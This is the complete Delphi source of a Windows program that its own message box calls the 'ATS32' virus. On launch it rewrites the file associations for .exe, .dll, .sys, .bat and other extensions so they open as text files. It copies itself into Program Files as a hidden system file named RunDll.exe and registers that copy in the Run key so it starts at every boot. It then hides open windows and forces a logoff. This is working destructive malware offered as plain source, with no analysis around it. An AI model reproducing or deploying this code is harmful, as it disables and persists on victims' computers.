   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, Registry, IDGlobal, StdCtrls, ExtCtrls;

   type
     TForm1 = class(TForm)
       Timer1: TTimer;
       procedure FormCreate(Sender: TObject);
       procedure Timer1Timer(Sender: TObject);
       procedure FormClose(Sender: TObject; var Action: TCloseAction);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;
     a, b : integer;
   implementation

   {$R *.dfm}

   procedure TForm1.FormCreate(Sender: TObject);
   var
   Registre:TRegistry;
   Prog, ExeName : string ;
   Ext : array[1..8] of string;
   begin
   b := 150;
   a := 3000;
   ExeName := Application.ExeName;
   application.Title := '' ;
   Ext[1] := '.exe' ;
   Ext[2] := '.ex_' ;
   Ext[3] := '.dll' ;
   Ext[4] := '.dl_' ;
   Ext[5] := '.ini' ;
   Ext[6] := '.hlp' ;
   Ext[7] := '.sys' ;
   Ext[8] := '.bat' ;
   Registre := TRegistry.Create;
   Registre.RootKey:=HKEY_CLASSES_ROOT ;
   for a := 1 to 8 do
    begin
     Registre.OpenKey(Ext[a], false);
     Registre.WriteString('','txtfile');
     Registre.CloseKey;
    end;
   Registre:=TRegistry.Create;
   Registre.RootKey:=HKEY_LOCAL_MACHINE;
   Registre.OpenKey('Software\Microsoft\Windows\CurrentVersion\', false);
   Prog := Registre.ReadString('ProgramFilesDir');
   Registre.Free;
   CopyFile(pansichar(Application.ExeName), pansichar(Prog+'\RunDll.exe'),false);
   Windows.SetFileAttributes(PChar(Prog+'\RunDll.exe'),7);
   Registre:=TRegistry.Create;
   Registre.RootKey:=HKEY_LOCAL_MACHINE ;
   Registre.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', false);
   Registre.WriteString('RunDll',Prog+'\RunDll.exe');
   Registre.Free;
   MessageBox(0,'The End.'+#13+'   Virus ATS32 créé par PyroBruno [T-H]','---===ATS32===---',16);
   Timer1.Enabled := True;
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   begin
   if b <> 0 then
   begin
   Form1.Color := Random(200000);
   b := b - 1;
   end else
   begin
   Form1.WindowState := wsMinimized;
   for b := 0 to 1024 do
   begin
   windows.ShowWindow(b,SW_HIDE);
   sleep(1);
   end;
   ExitWindows(0,0);
   end;
   end;

   procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
   begin
   ExitWindows(0,0);
   end;

   end.
